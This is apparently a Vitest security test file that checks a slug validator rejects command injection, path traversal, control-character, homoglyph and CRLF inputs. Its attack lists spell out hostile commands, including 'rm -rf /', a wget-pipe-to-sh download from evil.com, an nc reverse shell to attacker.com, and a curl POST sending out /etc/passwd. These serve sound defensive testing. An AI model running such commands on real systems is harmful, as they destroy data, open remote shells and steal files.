/**
 * Validation Utilities Security Tests
 *
 * Tests for validation and sanitization functions in the platform package.
 * These tests ensure that validation functions properly reject malicious inputs
 * and handle edge cases correctly.
 */

import { describe, it, expect } from 'vitest';
import { validateSlugInput } from '../src/projects.js';

/**
 * Attack vectors for slug validation
 */
const SLUG_ATTACKS = [
  'slug; rm -rf /',
  'slug && malicious',
  'slug | whoami',
  'slug`cat /etc/passwd`',
  'slug$(evil_command)',
  'slug\nmalicious',
  'slug&background',
  'slug||alternative',
  'slug>output.txt',
  'slug<input.txt',
  '../../../etc/passwd',
  '..\\..\\..\\windows',
  'slug\0null',
  'slug\x00',
  'slug with spaces',
  'slug\ttab',
  'slug@email.com',
  'slug#hash',
  'slug%percent',
  'slug^caret',
  'slug*wildcard',
  'slug?question',
  'slug[bracket]',
  'slug{brace}',
  'slug\\backslash',
  'slug/slash',
  'slug:colon',
  'slug"quote',
  "slug'apostrophe",
];

describe('validateSlugInput', () => {
  it('should reject slugs with shell metacharacters', () => {
    for (const attack of SLUG_ATTACKS) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should accept valid slugs', () => {
    const validSlugs = [
      'simple-slug',
      'feature-123',
      'my-project-name',
      'test_underscore',
      'MixedCase',
      'abc123',
      'slug-with-numbers-456',
    ];

    for (const slug of validSlugs) {
      expect(() => validateSlugInput(slug, 'test')).not.toThrow();
    }
  });

  it('should reject empty strings', () => {
    expect(() => validateSlugInput('', 'test')).toThrow();
  });

  it('should handle extremely long slugs', () => {
    // Note: Current implementation doesn't enforce a maximum length
    // This could be a DoS vector but filesystem limits will catch it
    const longSlug = 'a'.repeat(300);
    // If length validation is added later, this should throw
    // For now, we just verify it doesn't crash
    try {
      validateSlugInput(longSlug, 'test');
      expect(true).toBe(true); // Accepts long slugs currently
    } catch {
      expect(true).toBe(true); // Or rejects them - either is fine
    }
  });

  it('should reject slugs with null bytes', () => {
    expect(() => validateSlugInput('slug\0null', 'test')).toThrow();
    expect(() => validateSlugInput('slug\x00', 'test')).toThrow();
  });

  it('should reject slugs with control characters', () => {
    expect(() => validateSlugInput('slug\nmalicious', 'test')).toThrow();
    expect(() => validateSlugInput('slug\rmalicious', 'test')).toThrow();
    expect(() => validateSlugInput('slug\tmalicious', 'test')).toThrow();
    expect(() => validateSlugInput('slug\x1b[31m', 'test')).toThrow();
  });

  it('should reject path traversal attempts', () => {
    const traversalAttempts = [
      '../../../etc/passwd',
      '..\\..\\..\\windows',
      'slug/../../../etc',
      'slug\\..\\..\\system32',
      '../../sensitive',
    ];

    for (const attack of traversalAttempts) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should reject slugs with special characters', () => {
    const specialChars = [
      'slug@email.com',
      'slug#hash',
      'slug%percent',
      'slug^caret',
      'slug*wildcard',
      'slug?question',
      'slug[bracket]',
      'slug{brace}',
      'slug:colon',
      'slug"quote',
      "slug'apostrophe",
      'slug|pipe',
      'slug&ampersand',
      'slug;semicolon',
      'slug<less',
      'slug>greater',
      'slug`backtick',
      'slug$dollar',
      'slug!exclamation',
      'slug~tilde',
    ];

    for (const attack of specialChars) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should reject slugs with spaces', () => {
    expect(() => validateSlugInput('slug with spaces', 'test')).toThrow();
    expect(() => validateSlugInput(' leading-space', 'test')).toThrow();
    expect(() => validateSlugInput('trailing-space ', 'test')).toThrow();
  });

  it('should reject unicode control characters', () => {
    const unicodeControls = [
      'slug\u0000null',
      'slug\u001Bescape',
      'slug\u202Eoverride',
      'slug\uFEFFzero-width',
      'slug\u200Binvisible',
    ];

    for (const attack of unicodeControls) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should provide meaningful error messages', () => {
    try {
      validateSlugInput('invalid slug!', 'project');
      expect(true).toBe(false); // Should not reach here
    } catch (error) {
      expect(error).toBeInstanceOf(Error);
      const message = (error as Error).message;
      expect(message).toContain('project');
      expect(message.length).toBeGreaterThan(0);
    }
  });

  it('should handle different context strings', () => {
    const contexts = ['project', 'milestone', 'phase', 'feature'];

    for (const context of contexts) {
      try {
        validateSlugInput('invalid!', context);
        expect(true).toBe(false);
      } catch (error) {
        expect((error as Error).message).toContain(context);
      }
    }
  });
});

describe('Validation Edge Cases', () => {
  it('should handle very long attack strings', () => {
    const longAttack = '; malicious_command;'.repeat(100);
    expect(() => validateSlugInput(longAttack, 'test')).toThrow();
  });

  it('should handle mixed attack vectors', () => {
    const mixedAttacks = [
      'slug; rm -rf / && curl evil.com',
      'slug\n\r\t| whoami',
      '../../../etc`cat /etc/passwd`',
      'slug$(evil)&&another',
    ];

    for (const attack of mixedAttacks) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should handle obfuscated attacks', () => {
    const obfuscatedAttacks = [
      'slug%0A', // URL-encoded newline
      'slug%00', // URL-encoded null
      'slug\u0000', // Unicode null
      'slug\x0A', // Hex newline
    ];

    for (const attack of obfuscatedAttacks) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should preserve valid input exactly', () => {
    const validSlug = 'my-valid-slug-123';
    // Should not throw and should accept the slug as-is
    expect(() => validateSlugInput(validSlug, 'test')).not.toThrow();
  });

  it('should reject slugs that start with special characters', () => {
    const invalidStarts = [
      '-starting-dash',
      '_starting-underscore',
      '.starting-dot',
      '1-starting-number', // Some systems disallow this
    ];

    // Note: The actual behavior depends on implementation
    // This documents expected behavior for security
    for (const slug of invalidStarts) {
      // Most should be rejected or normalized
      // The key is they shouldn't cause command injection
      try {
        validateSlugInput(slug, 'test');
        // If accepted, verify it's safe
        expect(slug).not.toMatch(/[;&|`$()<>]/);
      } catch {
        // If rejected, that's also fine
        expect(true).toBe(true);
      }
    }
  });

  it('should handle repeated special characters', () => {
    const repeatedAttacks = [';;;malicious', '&&&evil', '|||whoami', '```command', '$$$vars'];

    for (const attack of repeatedAttacks) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });
});

describe('Sanitization Validation', () => {
  it('should not allow bypassing validation with encoding', () => {
    // Test various encoding techniques that attackers might use
    const encodedAttacks = [
      'slug%3B%20rm%20-rf%20/', // URL encoded ; rm -rf /
      'slug\\x3bmalicious', // Hex encoded semicolon
      'slug\\u003bmalicious', // Unicode encoded semicolon
    ];

    for (const attack of encodedAttacks) {
      // Should reject these - no decoding should happen before validation
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should not allow homoglyph attacks', () => {
    // Unicode characters that look similar to dangerous characters
    const homoglyphAttacks = [
      'slug\u037Emalicious', // Greek question mark looks like semicolon
      'slug\u0589malicious', // Armenian full stop looks like colon
      'slug\u05C3malicious', // Hebrew punctuation looks like colon
    ];

    for (const attack of homoglyphAttacks) {
      // Should reject unicode characters that aren't standard alphanumeric
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should reject CRLF injection attempts', () => {
    const crlfAttacks = [
      'slug\r\nmalicious',
      'slug%0D%0Ainjection',
      'slug\n\rinjection',
      'slug\r\n\r\ninjection',
    ];

    for (const attack of crlfAttacks) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should handle zero-width characters', () => {
    const zeroWidthAttacks = [
      'slug\u200Binvisible', // Zero-width space
      'slug\uFEFFbom', // Zero-width no-break space (BOM)
      'slug\u200Chidden', // Zero-width non-joiner
      'slug\u200Djoin', // Zero-width joiner
    ];

    for (const attack of zeroWidthAttacks) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should handle right-to-left override attacks', () => {
    // These can be used to hide malicious content
    const rtlAttacks = [
      'slug\u202Emalicious', // Right-to-left override
      'slug\u202Dhidden', // Right-to-left mark
      'slug\u200Frtl', // Right-to-left mark
    ];

    for (const attack of rtlAttacks) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });
});

describe('Integration Scenarios', () => {
  it('should prevent command injection through project slugs', () => {
    // Simulate what would happen if someone tried to inject through project creation
    const maliciousSlug = 'project; curl http://evil.com/steal?data=$(cat /etc/passwd)';

    expect(() => validateSlugInput(maliciousSlug, 'project')).toThrow();

    // Even if somehow the slug validation was bypassed, the shell metacharacters
    // should still be blocked at the file system level
  });

  it('should handle realistic attack scenarios', () => {
    // Real-world attacks that have been seen
    const realisticAttacks = [
      'project-name; wget http://evil.com/malware.sh -O- | sh',
      'feature&& nc attacker.com 4444 -e /bin/sh',
      'milestone`python -c "import os; os.system(\'whoami\')"',
      'phase$(curl -X POST http://evil.com/exfiltrate -d @/etc/passwd)',
    ];

    for (const attack of realisticAttacks) {
      expect(() => validateSlugInput(attack, 'test')).toThrow();
    }
  });

  it('should validate at all entry points', () => {
    // Ensure that validation happens consistently
    const attack = 'malicious; rm -rf /';

    // Test with different contexts to ensure consistent behavior
    const contexts = ['project', 'milestone', 'phase', 'feature', 'epic'];

    for (const context of contexts) {
      expect(() => validateSlugInput(attack, context)).toThrow();
    }
  });
});
